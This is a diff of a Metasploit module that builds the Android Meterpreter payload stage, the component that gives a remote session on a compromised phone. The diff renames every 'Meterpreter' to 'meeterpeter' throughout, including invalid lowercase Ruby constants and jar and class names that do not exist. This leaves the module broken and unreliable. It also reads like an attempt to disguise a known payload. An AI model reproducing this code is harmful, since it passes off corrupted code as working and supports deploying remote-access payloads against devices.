@@ -5,17 +5,17 @@
 
 require 'msf/core'
 require 'msf/core/payload/dalvik'
-require 'msf/base/sessions/meterpreter_android'
-require 'msf/base/sessions/meterpreter_options'
+require 'msf/base/sessions/meeterpeter_android'
+require 'msf/base/sessions/meeterpeter_options'
 
 
 module Metasploit3
-  include Msf::Sessions::MeterpreterOptions
+  include Msf::Sessions::meeterpeterOptions
 
   def initialize(info = {})
     super(update_info(info,
-      'Name'      => 'Android Meterpreter',
-      'Description' => 'Run a meterpreter server on Android',
+      'Name'      => 'Android meeterpeter',
+      'Description' => 'Run a meeterpeter server on Android',
       'Author'    => [
           'mihi', # all the hard work
           'egypt', # msf integration
@@ -24,7 +24,7 @@ module Metasploit3
       'Platform'    => 'android',
       'Arch'      => ARCH_DALVIK,
       'License'   => MSF_LICENSE,
-      'Session'   => Msf::Sessions::Meterpreter_Java_Android))
+      'Session'   => Msf::Sessions::meeterpeter_Java_Android))
 
     register_options(
     [
@@ -38,12 +38,12 @@ module Metasploit3
   #
   def generate_stage(opts={})
     # TODO: wire the UUID into the stage
-    clazz = 'androidpayload.stage.Meterpreter'
+    clazz = 'androidpayload.stage.meeterpeter'
     metstage = MetasploitPayloads.read("android", "metstage.jar")
-    met = MetasploitPayloads.read("android", "meterpreter.jar")
+    met = MetasploitPayloads.read("android", "meeterpeter.jar")
 
     # Name of the class to load from the stage, the actual jar to load
-    # it from, and then finally the meterpreter stage
+    # it from, and then finally the meeterpeter stage
     java_string(clazz) + java_string(metstage) + java_string(met)
   end
 end
